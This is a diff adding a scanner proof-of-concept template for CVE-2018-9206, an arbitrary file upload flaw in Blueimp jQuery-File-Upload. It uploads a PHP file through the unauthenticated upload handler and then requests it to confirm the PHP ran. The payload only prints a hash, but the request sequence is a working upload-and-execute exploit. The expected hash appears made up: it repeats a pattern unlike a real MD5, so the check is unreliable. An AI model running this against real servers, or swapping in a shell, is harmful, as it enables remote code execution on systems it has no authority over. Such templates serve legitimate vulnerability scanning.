@@ -1,0 +1,49 @@
+[info]
+author = "AVE"
+description = "通过 multipart/form-data 上传 PHP 文件到 jQuery-File-Upload 组件，验证文件是否成功上传并可访问。若返回上传文件的 MD5 哈希值，则证明存在未授权任意文件上传漏洞。"
+id = "POC-AVE-2018-0221"
+name = "Blueimp jQuery-File-Upload v9.22.0 任意文件上传 PoC"
+severity = "critical"
+tags = ["ave-2018-0221"]
+vuln_id = [
+    "CVE-2018-9206",
+    "AVE-2018-0221",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/jQuery-File-Upload/server/php/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary7MA4YWxkTrZu0gW\r
+Content-Disposition: form-data; name="files[]"; filename="test.php"\r
+Content-Type: application/x-php\r
+\r
+<?php echo md5("CVE-2018-9206"); ?>\r
+------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["test.php"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/jQuery-File-Upload/server/php/files/test.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["b0b9b2c6c6f1e7b0b9b2c6c6f1e7b0b9"]
